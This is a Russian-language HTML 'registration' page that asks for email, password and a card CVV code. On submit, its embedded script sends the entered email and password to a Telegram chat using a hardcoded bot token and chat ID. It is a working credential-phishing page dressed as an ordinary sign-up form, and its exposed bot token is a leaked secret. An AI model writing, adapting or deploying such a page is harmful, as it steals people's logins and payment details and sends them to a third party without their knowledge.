<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
      form{
        display: flex;
        flex-direction: column;
        width: 250px;
        margin-left: 100px;
      }
      h1{
        margin-left: 100px;
      }
      button{
        margin-top: 10px;
        padding: 10px;
        background: green;
      }
    </style>
</head>
<body>
    <h1>Регистрация</h1>
    <form id="registrationForm">
        <p></p>
        <label for="text">Email</label>
        <input type="text" id="email" name="username" required>
        <br>
        <p></p>
        <label for="text">Password</label>
        <input type="text" id="pass" name="email" required>
        <p></p>
        <label for="cvv">cvv код</label>
        <input type="text" id="cvv" name="cvv" required>
        <br>
        <button type="submit">Зарегистрироваться</button>
    </form>

    <script>
        const form = document.getElementById('registrationForm')
        
        let submit = addEventListener('submit', e => {
          e.preventDefault() 
          
          const username = document.getElementById('pass').value;
          const email = document.getElementById('email').value;
          
          const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
          const chatId = -1002372284940 
          const message = `Новая регистрация:\n Почта${email}\n Пароль${username}`;
          const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
          
          
          fetch(url) 
          .then(response => {
            if (response) {
              
              alert('Данные успешно отправлены в Telegram!');
            } else {
              console.log('error');
            }
          })
          .catch(error => {
            console.error('Ошибка:', error);
            alert('Ошибка при отправке данных.');
          });
        });
    </script>
</body>
</html>
